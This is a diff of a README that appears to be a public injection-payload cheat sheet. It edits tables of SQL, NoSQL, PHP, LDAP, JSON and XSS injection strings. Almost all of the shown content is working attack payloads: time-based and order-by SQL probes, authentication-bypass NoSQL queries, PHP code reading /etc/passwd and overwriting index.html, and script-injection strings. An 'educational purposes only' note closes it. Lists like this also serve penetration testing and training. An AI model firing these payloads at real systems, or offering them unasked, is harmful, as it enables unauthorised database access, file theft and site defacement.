@@ -1,8 +1,8 @@
-Injections Attack example by: [pxcs](https://github.com/pxcs/)
+Injections Attack example, by: [pxcs](https://github.com/pxcs/)
 
 <a href="https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/"><img src="https://png.pngtree.com/png-vector/20231205/ourmid/pngtree-artificial-intelligence-bionic-human-robot-png-image_10814416.png" align="right" width="100" alt="robot"></a>
 
-> [<img src="https://www.pngmart.com/files/23/Needle-PNG-Isolated-File.png" width="30">]() A common attack vector that uses malicious SQL code for backend database manipulation to access information that was not intended to be displayed. This information may include any number of items, including sensitive company data.
+> [<img src="https://www.pngmart.com/files/23/Needle-PNG-Isolated-File.png" width="30">]() A common attack vector that uses malicious query code for backend database manipulation, to access information that was not intended to be displayed. This information may include any number of items, including sensitive company data.
 <hr>
 
 ### List of query injection: 
@@ -70,12 +70,33 @@ Injections Attack example by: [pxcs](https://github.com/pxcs/)
 | ```AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#``` |
 | ```AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))``` |
 | ```UNION ALL SELECT 'INJ''ECT''XXX',2,3,4``` |
-| ```UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#``` |
+| ```%2b(select*from(select(sleep(2)))a)%2b``` |
 | ```admin') or '1'='1'/*``` |
 | ```admin') or ('1'='1'--``` |
 | ```benchmark(50000000,MD5(1))--``` |
 | ```or benchmark(50000000,MD5(1))--``` |
 | ```")) or sleep(5)="``` |
+| ```http://domain.com/index.php?id=1' order by 1))--``` |
+| ```http://domain.com/index.php?id=1' order by 1));%00``` |
+| ```http://domain.com/index.php?id=1' order by 1%60``` |
+| ```http://domain.com/index.php?id=1' order by 1") ;%00``` |
+| ```%23foo*%2F*bar%0D%0A``` |
+| ```http://domain.com/index.php?id=1'/**/order/**/by/**/1--/**/-``` |
+| ```database%23%0A(%23%0A)``` |
+
+| 💉 NoSQL Injections |
+| ---- |
+| ```username[$ne]=toto&password[$ne]=toto``` |
+| ```login[$gt]=admin&login[$lt]=test&pass[$ne]=1``` |
+| ```login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto``` |
+| ```{ "username": { "$ne": null }, "password": { "$ne": null } }``` |
+| ```{ "username": "admin' OR '1'='1", "password": "password" }``` |
+| ```EVAL "return redis.call('info')" 0``` |
+| ```FOR user IN users FILTER user.username == 'admin' 1 == 1 RETURN user``` |
+| ```{ "username": "admin", "password": { "$where": "this.password.length > 0" } }``` |
+| ```username[$ne]=toto&password[$regex]=md.{1}``` |
+| ```";return 'a'=='a' && ''=='``` |
+<br>
 
 | 💉 PHP Injections |
 | ---- |
@@ -99,20 +120,6 @@ Injections Attack example by: [pxcs](https://github.com/pxcs/)
 | ```echo%20file_get_contents("/etc/passwd");``` |
 | ```echo%20file_put_contents("index.html","Hello%20World.%20Testing!");``` |
 | ```ECHO%20FILE_PUT_CONTENTS("index.html","HELLO%20WORLD.%20TESTING!");``` |
-<br>
-
-| 💉 NoSQL Injections |
-| ---- |
-| ```username[$ne]=toto&password[$ne]=toto``` |
-| ```login[$gt]=admin&login[$lt]=test&pass[$ne]=1``` |
-| ```login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto``` |
-| ```{ "username": { "$ne": null }, "password": { "$ne": null } }``` |
-| ```{ "username": "admin' OR '1'='1", "password": "password" }``` |
-| ```EVAL "return redis.call('info')" 0``` |
-| ```FOR user IN users FILTER user.username == 'admin' 1 == 1 RETURN user``` |
-| ```{ "username": "admin", "password": { "$where": "this.password.length > 0" } }``` |
-| ```username[$ne]=toto&password[$regex]=md.{1}``` |
-| ```";return 'a'=='a' && ''=='``` |
 <br>
 
 | 💉 LDAP Injections |
@@ -196,7 +203,6 @@ Injections Attack example by: [pxcs](https://github.com/pxcs/)
 | ```<div>Welcome, <span id="username"></span></div>``` |
 | ```document.getElementById('user').innerHTML = getQueryParameter('user');``` |
 | ```http://example.com?username=<script>alert('Injected!');</script>``` |
-<br>
 
 | 💉 JSON Injections |
 | ---- |
@@ -301,4 +307,4 @@ Injections Attack example by: [pxcs](https://github.com/pxcs/)
 | ```<IMG SRC="javascript:alert('XSS');">``` |
 <hr>
 
-I know there is a lot more types, languages and attack method out there, here are just a simple list and example, I will update it soon. Big thanks to the [internet](https://www.youtube.com/watch?v=wcaiKgQU6VE&pp=ygUQcXVlcnkgaW5qZWN0aW9ucw%3D%3D) for the references. ***Note***, this module and list was just for an educational purposes only.
+I know there is a lot more types, languages and attack method out there, here are just a simple list and example, I will update it soon. Big thanks to the [internet](https://www.youtube.com/watch?v=wcaiKgQU6VE&pp=ygUQcXVlcnkgaW5qZWN0aW9ucw%3D%3D) for the references. ***Note***, this module and list was just for an educational purposes only. ✊🏻
